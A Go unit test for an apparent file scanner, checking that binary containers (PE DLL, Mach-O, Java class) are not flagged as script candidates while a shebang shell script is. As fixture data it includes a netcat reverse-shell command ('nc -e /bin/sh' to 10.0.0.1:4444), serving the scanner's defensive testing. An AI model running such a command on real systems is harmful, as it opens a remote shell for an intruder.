package scanner

import (
	"testing"

	"aether/internal/config"
)

// TestScriptCandidateRejectsBinaryContainers locks the .NET-DLL-as-text
// false positive: PE/Mach-O binaries must never reach script heuristics even
// when their leading bytes are printable enough to look like text.
func TestScriptCandidateRejectsBinaryContainers(t *testing.T) {
	cfg := config.NewDefaultConfig()

	peDLL := append([]byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00"), []byte("strings about nc -e /bin/sh networking helpers")...)
	if isScriptOrTextCandidate("/opt/app/System.ServiceModel.Primitives.dll", peDLL, cfg, 0o644) {
		t.Error("PE binary container must not be a script candidate")
	}

	macho := append([]byte{0xcf, 0xfa, 0xed, 0xfe}, []byte("mach-o payload")...)
	if isScriptOrTextCandidate("/opt/app/libhelper.dylib", macho, cfg, 0o755) {
		t.Error("Mach-O binary must not be a script candidate")
	}

	javaClass := append([]byte{0xca, 0xfe, 0xba, 0xbe}, []byte("java class data")...)
	if isScriptOrTextCandidate("/opt/app/BouncyCastle.class", javaClass, cfg, 0o644) {
		t.Error("Java class file must not be a script candidate")
	}

	// Control: a real shell script with a shebang stays a candidate.
	shell := []byte("#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
	if !isScriptOrTextCandidate("/tmp/x.sh", shell, cfg, 0o755) {
		t.Error("shebang script must remain a script candidate")
	}
}
